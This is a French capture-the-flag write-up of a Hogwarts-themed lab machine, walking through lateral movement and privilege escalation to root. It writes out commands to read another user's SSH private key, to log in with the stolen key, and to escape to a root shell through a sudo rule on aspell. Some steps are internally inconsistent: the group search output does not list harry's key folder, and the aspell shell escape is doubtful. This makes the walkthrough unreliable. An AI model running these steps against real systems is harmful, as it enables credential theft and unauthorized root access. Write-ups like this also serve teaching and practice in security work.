Yer a Wizard #2
> **Catégorie :** Post-exploitation / Pivot latéral / Privilege Escalation (GTFOBins)
> **Cible :** `<IP_CIBLE>` (machine « Hogwarts », suite de Yer a Wizard #1)
> **Flag :** `EPI{t3H_tRuTh_1T_15_4_834ut1fUL_4nD_t3rr18L3_th1n9}`
---
Objectif
Suite directe de Yer a Wizard #1. On repart de l'accès `hagrid` et le but est
de remonter la chaîne des utilisateurs (hagrid → dumbledore → harry → root)
en exploitant à chaque étape une mauvaise configuration : une énigme cachée, un
groupe aux permissions trop larges, une clé SSH exposée, et enfin une règle
`sudo` mal pensée. Objectif final : lire `/root/root.txt`.
C'est un challenge de pivot latéral : l'intérêt n'est pas un seul exploit,
mais l'enchaînement d'accès successifs.
---
1. Reconnaissance réseau (Nmap)
```bash
nmap -p- -sV -sC <IP_CIBLE>
```
`-p-` → scanne les 65535 ports (et pas seulement les 1000 par défaut).
Essentiel pour ne rien rater d'un service planqué sur un port haut.
`-sV` → détection de version des services.
`-sC` → scripts NSE par défaut.
Ports identifiés :
Port	Service	Remarque
22	SSH	notre point d'entrée
21	FTP (vsftpd)	confirmé plus tard via `ps aux`
—	services système	un cron tourne en arrière-plan
---
2. Accès initial — hagrid
On réutilise les identifiants `hagrid` récupérés dans Yer a Wizard #1 :
```bash
ssh hagrid@<IP_CIBLE>
```
→ On retrouve la session `hagrid@hogwarts:~$`.
---
3. Énumération chez hagrid
Dans le home de `hagrid`, deux éléments intéressants :
`riddle.txt` → une série de lignes ressemblant à des hashs SHA-512, précédée
d'une énigme (« take a crack at it, would you? »).
`hut/.hidden` → dossier caché contenant le mot de passe de `hagrid` lui-même
(déjà exploité en amont).
Le piège dans riddle.txt
En examinant `riddle.txt` ligne par ligne, une des lignes n'est pas un
vrai hash : c'est du texte encodé en hexadécimal.
```
496e206661637420...
```
> **Comment repérer l'intrus ?** Un SHA-512 fait exactement 128 caractères hex.
> La ligne suspecte a une longueur différente, et une fois décodée en ASCII elle
> donne du texte lisible — un hash, lui, donnerait du charabia.
On la décode :
```bash
echo "496e206661637420..." | xxd -r -p
```
`xxd -r -p` → convertit une chaîne hexadécimale « plain » en octets bruts.
→ Résultat :
```
In fact, this was simple, truly, the password is ByMerlinBeard!
```
Mot de passe obtenu : `ByMerlinBeard!`
---
4. Accès à dumbledore
Ce mot de passe ne fonctionne pas en SSH direct (l'utilisateur `dumbledore`
n'a pas d'accès réseau prévu), mais fonctionne en `su` local depuis la
session `hagrid` :
```bash
su dumbledore
# mot de passe : ByMerlinBeard!
```
> **Distinction importante :** un compte peut être **verrouillé pour SSH** mais
> rester utilisable localement via `su`. Toujours tester `su` quand un mot de
> passe valide semble « ne pas marcher » à distance.
---
5. Pivot latéral — abus du groupe `headmaster`
Une fois `dumbledore`, on énumère ses droits, en particulier ses groupes :
```bash
id
# → groups=dumbledore,headmaster

getent group headmaster
# → headmaster:x:1003:dumbledore

find / -group headmaster 2>/dev/null
# → /home/hagrid/.ssh
# → /home/dumbledore/.ssh
```
`id` → montre l'utilisateur et tous ses groupes (le vecteur ici).
`getent group headmaster` → liste les membres du groupe.
`find / -group headmaster` → trouve tous les fichiers appartenant à ce
groupe. C'est le réflexe clé : « à quoi ce groupe me donne-t-il accès ? »
Le groupe `headmaster` donne un accès en lecture au dossier `.ssh` de
`harry`, qui contient sa clé privée SSH exposée :
```bash
cat /home/harry/.ssh/id_ed25519
```
> **La faille :** une clé privée SSH doit être lisible **uniquement** par son
> propriétaire (`chmod 600`). Ici, des permissions de groupe trop larges la
> rendent lisible par tout membre de `headmaster`.
On sauvegarde la clé localement et on l'utilise pour se connecter en tant que
`harry` :
```bash
# sur notre machine
chmod 600 harry_key            # SSH refuse une clé aux permissions trop ouvertes
ssh -i harry_key harry@<IP_CIBLE>
```
`-i harry_key` → utilise cette clé privée pour l'authentification.
---
6. Énumération chez harry — sudoers
Premier réflexe sur tout nouvel utilisateur : vérifier les droits `sudo`.
```bash
sudo -l
```
Résultat :
```
harry ALL=(root) NOPASSWD: /usr/bin/aspell
```
→ `harry` peut exécuter `aspell` en tant que root, sans mot de passe.
Confirmé aussi par lecture directe (le fichier est world-readable) :
```bash
cat /etc/sudoers.d/harry
```
---
7. Impasse écartée — dumbledore n'a pas de sudo
En parallèle, on avait vérifié la piste `dumbledore` :
```bash
# en tant que dumbledore
sudo -l
# → aucun droit sudo
```
Cela écarte cette voie et confirme que l'escalade doit passer par `harry` et
`aspell`. (Documenter les impasses évite d'y revenir en boucle.)
---
8. Escalade de privilèges — GTFOBins (aspell)
`aspell` est un correcteur orthographique. En apparence inoffensif, mais tout
binaire qui peut lire/exécuter/écrire peut être détourné quand il tourne en
root. GTFOBins documente exactement ces
détournements.
Pour `aspell`, la technique consiste à lui faire ouvrir un shell via sa fonction
d'aide au filtrage. Exemple typique :
```bash
sudo aspell -a
!/bin/sh
```
> **Principe (GTFOBins) :** quand un programme lancé en root permet d'exécuter
> une commande, d'échapper vers un shell, ou de lire un fichier arbitraire, il
> devient un vecteur d'escalade. La règle `NOPASSWD` amplifie le problème car
> aucune barrière n'est demandée.
→ On obtient un shell root, ce qui permet de lire :
```bash
cat /root/root.txt
```
---
9. Décodage du flag final
Le contenu de `root.txt` est encodé en trois couches successives :
```
hex → base64 → base32
```
On les retire dans l'ordre :
```bash
cat /root/root.txt | xxd -r -p | base64 -d | base32 -d
```
`xxd -r -p` → décode l'hexadécimal
`base64 -d` → retire la couche Base64
`base32 -d` → retire la couche Base32
→ Flag final :
```
EPI{t3H_tRuTh_1T_15_4_834ut1fUL_4nD_t3rr18L3_th1n9}
```
---
Concepts clés à retenir
Concept	Explication
Pivot latéral	Enchaîner des accès d'un utilisateur à l'autre plutôt qu'un seul exploit.
Stéganographie légère / encodage caché	Du texte hex glissé au milieu de vrais hashs pour passer inaperçu. Repérable par la longueur et le décodage.
`su` vs SSH	Un compte sans accès SSH peut rester accessible localement via `su`.
Abus de groupe	`id` + `find / -group X` révèlent ce qu'un groupe permet de lire/écrire.
Clé SSH exposée	Une clé privée lisible par le groupe = compromission directe du compte.
`sudo -l`	Toujours le lancer sur chaque compte : révèle les binaires exécutables en root.
GTFOBins	Base de référence pour détourner un binaire sudo légitime en shell root.
Décodage en couches	hex/base64/base32 sont réversibles sans clé ; il suffit de les retirer dans l'ordre.
---
Résumé de la chaîne d'attaque
```
Nmap recon
   → Creds hagrid (challenge précédent)
   → riddle.txt : hex caché parmi des hashs → mdp dumbledore
   → su dumbledore → abus du groupe "headmaster"
   → vol de la clé SSH de harry (permissions de groupe trop larges)
   → sudo -l chez harry → NOPASSWD sur aspell
   → GTFOBins aspell → shell root
   → root.txt → décodage hex → base64 → base32 → FLAG
```